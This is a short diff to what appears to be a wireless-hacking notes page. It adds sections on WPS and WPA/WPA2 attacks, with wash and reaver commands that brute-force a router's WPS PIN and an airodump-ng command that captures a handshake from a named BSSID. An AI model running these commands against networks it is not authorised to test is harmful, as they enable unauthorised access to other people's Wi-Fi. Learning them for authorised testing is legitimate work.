@@ -61,7 +61,7 @@ Just wait for some time, then after receiving enough  packets in the `#Data` col
 
 
 
-### wpa / wpa2 hacking.
+### wps hacking.
 
 `wash --interface wlan0mon` a wps recon tool to search around for wps enabled AP/routers.
 
@@ -71,7 +71,11 @@ Just wait for some time, then after receiving enough  packets in the `#Data` col
 
 `reaver --bssid targetBssid --channel targetChannel -i wlan0mon -vvv --no-associate` running reaver to carryout bruteforcing.
 
-<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption><p><code>reaver</code></p></figcaption></figure>
+
+### wpa / wpa2 hacking
+
+`airodump-ng --bssid 98:A9:42:27:A2:CA --channel 10 --write wpa_handshake wlan0mon` to create a handshake .cap file.&#x20;
 
 
 
